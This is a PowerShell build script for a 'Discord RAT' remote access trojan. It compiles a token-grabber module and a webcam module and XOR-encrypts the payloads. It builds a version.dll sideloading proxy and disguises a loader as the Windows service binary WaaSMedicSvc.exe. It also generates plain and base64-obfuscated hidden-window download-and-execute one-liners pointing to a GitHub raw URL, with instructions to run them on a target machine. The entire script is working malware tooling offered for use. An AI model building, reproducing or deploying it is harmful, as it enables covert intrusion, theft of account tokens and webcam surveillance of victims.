# Discord RAT - Shaher dev Edition - PowerShell Build Script
# Enhanced build script with error handling and optimization

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Discord RAT - Shaher dev Edition Builder" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Function to find MSBuild
function Find-MSBuild {
    $msbuildPaths = @(
        "${env:ProgramFiles}\Microsoft Visual Studio\18\Insiders\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\18\Professional\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\18\Enterprise\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\Professional\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\Enterprise\MSBuild\Current\Bin\MSBuild.exe"
    )
    
    foreach ($path in $msbuildPaths) {
        if (Test-Path $path) {
            return $path
        }
    }
    
    # Fallback: search Visual Studio install folders
    foreach ($root in @("${env:ProgramFiles}\Microsoft Visual Studio", "${env:ProgramFiles(x86)}\Microsoft Visual Studio")) {
        if (Test-Path $root) {
            $found = Get-ChildItem -Path $root -Filter MSBuild.exe -Recurse -ErrorAction SilentlyContinue |
                Where-Object { $_.FullName -match '\\MSBuild\\Current\\Bin\\MSBuild\.exe$' } |
                Select-Object -First 1
            if ($found) {
                return $found.FullName
            }
        }
    }
    
    # Try to find in PATH
    $msbuild = Get-Command msbuild -ErrorAction SilentlyContinue
    if ($msbuild) {
        return $msbuild.Source
    }
    
    return $null
}

# Find MSBuild
$msbuildPath = Find-MSBuild
if (-not $msbuildPath) {
    Write-Host "ERROR: MSBuild not found. Please install Visual Studio or Visual Studio Build Tools." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host "Using MSBuild: $msbuildPath" -ForegroundColor Green
Write-Host ""

# Create output directories
$buildDir = "build"
$modulesDir = "build\modules"
if (-not (Test-Path $buildDir)) { New-Item -ItemType Directory -Path $buildDir -Force | Out-Null }
if (-not (Test-Path $modulesDir)) { New-Item -ItemType Directory -Path $modulesDir -Force | Out-Null }

# Build function
function Build-Project {
    param(
        [string]$ProjectPath,
        [string]$ProjectName,
        [string]$OutputPath = "..\build\",
        [string]$Platform = $(if ($ProjectPath -like '*.sln') { 'Any CPU' } else { 'AnyCPU' })
    )
    
    Write-Host "Building $ProjectName..." -ForegroundColor Yellow
    
    & $msbuildPath $ProjectPath `
        /p:Configuration=Release `
        "/p:Platform=$Platform" `
        "/p:OutputPath=$OutputPath" `
        /verbosity:minimal `
        /nologo 2>&1 | ForEach-Object {
            if ($_ -is [System.Management.Automation.ErrorRecord]) {
                Write-Host $_.ToString() -ForegroundColor Red
            } else {
                Write-Host $_
            }
        }
    $exitCode = $LASTEXITCODE
    
    if ($exitCode -eq 0) {
        Write-Host "[OK] $ProjectName built successfully" -ForegroundColor Green
        return $true
    } else {
        Write-Host "[FAIL] Failed to build $ProjectName (Exit code: $exitCode)" -ForegroundColor Red
        return $false
    }
}

# Build projects
$success = $true

# Build main application
if (-not (Build-Project "Discord rat\Discord rat.sln" "Discord RAT - Main Application")) {
    $success = $false
}

# Build Token Grabber module
if (-not (Build-Project "Token grabber\Token grabber.csproj" "Token Grabber Module" "..\build\modules\")) {
    $success = $false
}

# Build Webcam module
if (-not (Build-Project "Webcam\Webcam.csproj" "Webcam Module" "..\build\modules\")) {
    $success = $false
}

function Protect-PayloadFile {
    param(
        [string]$InputPath,
        [string]$OutputPath,
        [byte]$XorKey = 0xA7
    )

    $bytes = [System.IO.File]::ReadAllBytes($InputPath)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $XorKey
    }

    $outputDir = Split-Path $OutputPath -Parent
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    }

    [System.IO.File]::WriteAllBytes($OutputPath, $bytes)
}

function Prepare-ProxyPayloads {
    Write-Host "Preparing protected payload files..." -ForegroundColor Yellow

    $requiredFiles = @{
        "build\Discord rat.dll" = "build\payload\core.bin"
        "build\modules\Token grabber.dll" = "build\payload\modules\token.bin"
        "build\modules\Webcam.dll" = "build\payload\modules\media.bin"
    }

    foreach ($entry in $requiredFiles.GetEnumerator()) {
        if (-not (Test-Path $entry.Key)) {
            Write-Host "[FAIL] Missing payload file: $($entry.Key)" -ForegroundColor Red
            return $false
        }
        Protect-PayloadFile -InputPath $entry.Key -OutputPath $entry.Value
    }

    if (-not (Test-Path "build\Loader.exe")) {
        Write-Host "[FAIL] Missing Loader.exe for proxy build" -ForegroundColor Red
        return $false
    }

    Copy-Item "build\Loader.exe" "build\WaaSMedicSvc.exe" -Force
    Copy-Item "build\Loader.exe" "build\RuntimeHost.exe" -Force
    Write-Host "[OK] Protected payloads + WaaSMedicSvc.exe ready" -ForegroundColor Green
    return $true
}

function Build-ProxyDll {
    Write-Host "Building version.dll proxy (x64 + x86, in-memory embedded payload)..." -ForegroundColor Yellow

    if (-not (Prepare-ProxyPayloads)) {
        return $false
    }

    $requiredFiles = @(
        "build\WaaSMedicSvc.exe",
        "build\payload\core.bin",
        "build\payload\modules\token.bin",
        "build\payload\modules\media.bin"
    )

    foreach ($file in $requiredFiles) {
        if (-not (Test-Path $file)) {
            Write-Host "[FAIL] Missing proxy resource: $file" -ForegroundColor Red
            return $false
        }
    }

    $vcvars64 = Get-ChildItem "${env:ProgramFiles}\Microsoft Visual Studio" -Filter vcvars64.bat -Recurse -ErrorAction SilentlyContinue |
        Select-Object -First 1
    $vcvars32 = Get-ChildItem "${env:ProgramFiles}\Microsoft Visual Studio" -Filter vcvars32.bat -Recurse -ErrorAction SilentlyContinue |
        Select-Object -First 1

    if (-not $vcvars64) {
        Write-Host "[WARN] vcvars64.bat not found. Skipping version.dll proxy build." -ForegroundColor Yellow
        return $true
    }

    New-Item -ItemType Directory -Path "build\proxy\x64" -Force | Out-Null
    New-Item -ItemType Directory -Path "build\proxy\x86" -Force | Out-Null

    $builtAny = $false

    $x64Cmd = "`"$($vcvars64.FullName)`" && rc /nologo /fo build\proxy\version.x64.res proxy\version.rc && cl /nologo /LD proxy\version.cpp build\proxy\version.x64.res /Fe:build\proxy\x64\version.dll /link /DEF:proxy\version.exports.def shell32.lib strsafe.lib winhttp.lib"
    cmd /c $x64Cmd 2>&1 | ForEach-Object { Write-Host $_ }
    if (Test-Path "build\proxy\x64\version.dll") {
        Copy-Item "build\proxy\x64\version.dll" "build\version.dll" -Force
        $builtAny = $true
        $sizeMb = [math]::Round((Get-Item "build\version.dll").Length / 1MB, 2)
        Write-Host "[OK] version.dll (x64) built - ${sizeMb} MB (in-memory load)" -ForegroundColor Green
    }

    if ($vcvars32) {
        $x86Cmd = "`"$($vcvars32.FullName)`" && rc /nologo /fo build\proxy\version.x86.res proxy\version.rc && cl /nologo /LD proxy\version.cpp build\proxy\version.x86.res /Fe:build\proxy\x86\version.dll /link /DEF:proxy\version.exports.def shell32.lib strsafe.lib winhttp.lib"
        cmd /c $x86Cmd 2>&1 | ForEach-Object { Write-Host $_ }
        if (Test-Path "build\proxy\x86\version.dll") {
            $builtAny = $true
            Write-Host "[OK] version.dll (x86) built" -ForegroundColor Green
        }
    }

    Remove-Item "build\version.obj", "build\version.exp", "build\version.lib" -ErrorAction SilentlyContinue

    if (-not $builtAny) {
        Write-Host "[WARN] version.dll proxy build failed." -ForegroundColor Yellow
    }

    return $true
}

function New-ObfuscatedInstallCommand {
    param([string]$DeployUrl)

    $key = 0xA7
    $urlBytes = [Text.Encoding]::UTF8.GetBytes($DeployUrl)
    $encodedBytes = $urlBytes | ForEach-Object { $_ -bxor $key }
    $byteList = ($encodedBytes | ForEach-Object { "0x{0:X2}" -f $_ }) -join ","

    $innerScript = @"
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
`$k=$key
`$b=@($byteList)
`$u=[Text.Encoding]::UTF8.GetString([byte[]](`$b|ForEach-Object{`$_ -bxor `$k}))
`$c=New-Object Net.WebClient
`$c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
iex `$c.DownloadString(`$u)
"@

    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($innerScript))
    return "powershell -nop -w hidden -ep bypass -enc $encodedCommand"
}

function Prepare-GithubDeployPackage {
    Write-Host "Preparing GitHub deploy package..." -ForegroundColor Yellow

    $githubDir = "build\github"
    if (Test-Path $githubDir) {
        Remove-Item $githubDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    New-Item -ItemType Directory -Path $githubDir -Force | Out-Null

    $copyMap = @{
        "build\version.dll" = Join-Path $githubDir "version.dll"
    }

    foreach ($entry in $copyMap.GetEnumerator()) {
        if (-not (Test-Path $entry.Key)) {
            Write-Host "[FAIL] Missing file for GitHub package: $($entry.Key)" -ForegroundColor Red
            return $false
        }
        Copy-Item $entry.Key $entry.Value -Force
    }

    $configPath = "deploy\config.json"
    $githubBaseUrl = "https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/deploy"
    if (Test-Path $configPath) {
        $config = Get-Content $configPath -Raw | ConvertFrom-Json
        if ($config.GitHubBaseUrl) {
            $githubBaseUrl = $config.GitHubBaseUrl
        }
    }

    $deployScript = Get-Content "deploy\deploy.ps1" -Raw
    $deployScript = $deployScript -replace '(?m)^(\s*\[string\]\$GitHubBaseUrl = )"[^"]*"', "`${1}`"$githubBaseUrl`""

    Set-Content -Path (Join-Path $githubDir "deploy.ps1") -Value $deployScript -Encoding UTF8
    Copy-Item "deploy\deploy.cmd" (Join-Path $githubDir "deploy.cmd") -Force
    Copy-Item "deploy\config.json" (Join-Path $githubDir "config.json") -Force

    $deployUrl = "$githubBaseUrl/deploy.ps1".Replace('\', '/')
    $oneLiner = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""iex ((New-Object Net.WebClient).DownloadString('$deployUrl'))"""
    $obfuscatedOneLiner = New-ObfuscatedInstallCommand -DeployUrl $deployUrl

    $oneLinerCmd = "@echo off`r`n$oneLiner`r`npause"
    $obfuscatedCmd = "@echo off`r`n$obfuscatedOneLiner"

    Set-Content -Path (Join-Path $githubDir "install.cmd") -Value $oneLinerCmd -Encoding ASCII
    Set-Content -Path (Join-Path $githubDir "install_oneliner.txt") -Value $oneLiner -Encoding ASCII
    Set-Content -Path (Join-Path $githubDir "install_obfuscated.txt") -Value $obfuscatedOneLiner -Encoding ASCII
    Set-Content -Path (Join-Path $githubDir "install_obfuscated.cmd") -Value $obfuscatedCmd -Encoding ASCII
    Copy-Item (Join-Path $githubDir "install_obfuscated.txt") "deploy\install_obfuscated.txt" -Force

    Write-Host "[OK] GitHub package ready: build\github\" -ForegroundColor Green
    Write-Host "     Upload the contents of build\github\ to your repo under /deploy/" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Obfuscated one-liner (recommended):" -ForegroundColor Cyan
    Write-Host $obfuscatedOneLiner -ForegroundColor White
    Write-Host ""
    Write-Host "Plain one-liner:" -ForegroundColor DarkGray
    Write-Host $oneLiner -ForegroundColor DarkGray
    return $true
}

if (-not (Build-ProxyDll)) {
    $success = $false
}

if (-not (Prepare-GithubDeployPackage)) {
    $success = $false
}

Write-Host ""
if ($success) {
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "Build completed successfully!" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Output files:" -ForegroundColor Cyan
    Write-Host "- GitHub upload folder: build\github\  (upload to repo /deploy/)" -ForegroundColor White
    Write-Host "- Obfuscated install: build\github\install_obfuscated.txt" -ForegroundColor White
    Write-Host "- Sideload proxy: build\version.dll  (~3 MB, in-memory embedded payload)" -ForegroundColor White
    Write-Host "- Protected payload: build\payload\core.bin (+ modules/*.bin)" -ForegroundColor White
    Write-Host ""
    Write-Host "GitHub setup:" -ForegroundColor Cyan
    Write-Host "1. Edit deploy\config.json with your GitHub raw URL" -ForegroundColor White
    Write-Host "2. Upload build\github\* to your repo under deploy/" -ForegroundColor White
    Write-Host "3. Run the one-liner CMD on target machine" -ForegroundColor White
} else {
    Write-Host "========================================" -ForegroundColor Red
    Write-Host "Build failed!" -ForegroundColor Red
    Write-Host "========================================" -ForegroundColor Red
    Write-Host "Please check the error messages above and fix any issues." -ForegroundColor Yellow
}

Write-Host ""
Read-Host "Press Enter to exit"
